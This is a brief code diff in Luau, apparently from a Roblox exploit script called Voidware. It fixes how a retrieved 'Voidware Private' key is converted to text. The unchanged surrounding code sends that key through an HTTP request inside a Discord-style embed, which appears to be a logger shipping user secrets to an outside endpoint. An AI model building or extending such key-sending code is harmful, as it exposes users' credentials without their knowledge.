@@ -18,7 +18,7 @@ local CheckVoidwarePrivate: () -> (string?) = function()
 	end;
 end;
 
-local VoidwarePrivate = (tostring(CheckVoidwarePrivate()) or "Failed To Retreive Voidware Key")
+local VoidwarePrivate = (CheckVoidwarePrivate() or "Failed To Retreive Voidware Key")
 
 task.spawn(function()
 	local HttpRequest = request
@@ -78,7 +78,7 @@ task.spawn(function()
 
 				{
 					["name"] = "",
-					["value"] = "Voidware: " .. VoidwarePrivate,
+					["value"] = "Voidware: " .. tostring(VoidwarePrivate),
 					["inline"] = false
 				},
 			},
